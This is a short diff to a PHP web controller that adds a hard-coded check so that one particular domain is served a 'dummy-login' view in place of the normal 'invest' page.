@@ -99,6 +99,10 @@ class FrontendController extends Controller
             // Convert to float and back to ensure it's a clean number
             $amount = floatval($amount);
         }
+
+        if($url == 'ladyoriginaltee.com') {
+            return view('dummy-login', compact('setting', 'header', 'footer', 'website', 'amount'));
+        }
         
         return view('invest', compact('setting', 'header', 'footer', 'website', 'amount'));
     }
